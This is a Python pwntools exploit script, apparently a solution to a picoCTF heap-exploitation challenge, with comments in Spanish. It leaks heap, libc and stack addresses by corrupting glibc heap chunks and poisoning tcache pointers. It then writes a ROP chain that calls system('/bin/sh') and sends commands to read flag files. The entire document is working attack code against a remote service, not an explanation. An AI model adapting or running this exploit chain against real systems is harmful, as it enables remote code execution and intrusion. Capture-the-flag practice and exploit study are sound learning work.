#!/usr/bin/env python3
from pwn import *
import os
import glob
import time

HOST = "tethys.picoctf.net"
PORT = 56635

context.arch = "amd64"
context.log_level = "info"

def find_libc():
    for name in ["./libc.so.6", "./libc.so", "./libc-2.35.so"] + glob.glob("./libc*"):
        if os.path.isfile(name):
            return name
    log.error("No encuentro libc.so.6 en esta carpeta")
    exit(1)

libc = ELF(find_libc(), checksec=False)

def start():
    return remote(HOST, PORT)

def create_pkt(sz, data, consume=True):
    # IMPORTANTE: consumir la línea completa, no solo hasta PKT_RES
    io.recvline_contains(b"PKT_RES", timeout=10)
    io.send(p64(sz))
    io.sendline(data)

    if consume:
        return io.recvline(timeout=10)
    return b""

def leak6_from_response():
    line = io.recvline(timeout=10)
    if not line:
        log.error("No recibí línea de leak")
        exit(1)

    log.debug(f"leak line raw = {line!r}")

    # Formato típico:
    # b'\x1b[1;33mPKT_DATA\x1b[m:[<leak>]\n'
    # El exploit original toma bytes [20:26].
    leak = u64(line.rstrip()[20:26].ljust(8, b"\x00"))
    return leak

io = start()

# ============================================================
# Stage 1: leak heap
# ============================================================
log.info("Stage 1: leaking heap")

create_pkt(0x10, b"a" * 0x10 + p64(0xd51))
create_pkt(0xd30, b"")
create_pkt(0x10, b"\x01" + b"\x00" * 6, consume=False)

heap_leak = leak6_from_response()
heap_base = heap_leak - 0x2b0

if heap_base < 0x100000000000:
    log.error(f"Heap leak inválido: heap_leak={heap_leak:#x}, heap_base={heap_base:#x}")
    log.error("Si esto pasa, la instancia se desincronizó. Ejecuta el script otra vez.")
    exit(1)

create_pkt(0xd00, b"")

log.success(f"heap_leak = {heap_leak:#x}")
log.success(f"heap_base = {heap_base:#x}")

# ============================================================
# Stage 2: leak libc
# ============================================================
log.info("Stage 2: leaking libc")

create_pkt(0x270, b"a" * 0x270 + p64(0x41))
create_pkt(0xfa0, b"a" * 0xfa0 + p64(0x51))
create_pkt(0xfb0, b"a" * 0xfb0 + p64(0x41))
create_pkt(0xf90, b"a" * 0xf90 + p64(0x61))
create_pkt(0x40,  b"a" * 0x40  + p64(0xfb1))
create_pkt(0xf90, b"")

addr_E = heap_base + 0xa9050
addr_C_fd = heap_base + 0x65fd0

create_pkt(0x20, b"a" * 0x22008 + p64((addr_C_fd >> 12) ^ addr_E))
create_pkt(0x10, b"")

create_pkt(0x10, p64(1)[:7], consume=False)

libc_leak = leak6_from_response()
libc_base = libc_leak - 0x219ce0
libc.address = libc_base

if libc_base < 0x700000000000:
    log.error(f"Libc leak inválido: libc_leak={libc_leak:#x}, libc_base={libc_base:#x}")
    exit(1)

# Repair E.mchunk_size
create_pkt(0x30, b"a" * 0x210a0 + p64(0xf91)[:7])
create_pkt(0xf80, b"")

log.success(f"libc_leak = {libc_leak:#x}")
log.success(f"libc_base = {libc_base:#x}")

# ============================================================
# Stage 3: leak stack via environ
# ============================================================
log.info("Stage 3: leaking stack")

create_pkt(0x10,  b"a" * 0x10  + p64(0x41))
create_pkt(0xfa0, b"a" * 0xfa0 + p64(0x51))
create_pkt(0xfb0, b"a" * 0xfb0 + p64(0x41))
create_pkt(0x30, b"")

addr_C_fd = heap_base + 0x10ffd0
addr_environ = libc.sym["environ"]

create_pkt(0x20, b"a" * 0x22008 + p64((addr_C_fd >> 12) ^ (addr_environ - 0x10)))
create_pkt(0x10, b"")

create_pkt(0x10, p64(1)[:7], consume=False)

stack_leak = leak6_from_response()
ret_addr = stack_leak - 0x150

if stack_leak < 0x700000000000:
    log.error(f"Stack leak inválido: stack_leak={stack_leak:#x}")
    exit(1)

log.success(f"stack_leak = {stack_leak:#x}")
log.success(f"ret_addr   = {ret_addr:#x}")

# ============================================================
# Stage 4: write ROP chain on return address
# ============================================================
log.info("Stage 4: writing ROP chain")

create_pkt(0xf70, b"a" * 0xf70 + p64(0x41))
create_pkt(0xfa0, b"a" * 0xfa0 + p64(0x51))
create_pkt(0xfb0, b"a" * 0xfb0 + p64(0x41))
create_pkt(0x30, b"")

addr_C_fd = heap_base + 0x175fd0

create_pkt(0x20, b"a" * 0x22008 + p64((addr_C_fd >> 12) ^ (ret_addr - 0x28)))
create_pkt(0x10, b"")

pop_rdi = libc_base + 0x001bc061
ret     = libc_base + 0x001bc062
bin_sh  = libc_base + 0x1d8698
system  = libc.sym["system"]

payload  = b"a" * 0x20
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(ret)
payload += p64(system)

create_pkt(0x10, payload, consume=False)

log.success("ROP enviado. Intentando leer flag...")

time.sleep(0.5)
io.sendline(b"cat flag.txt 2>/dev/null; cat /flag.txt 2>/dev/null; cat /home/ctf/flag.txt 2>/dev/null; id")
io.interactive()
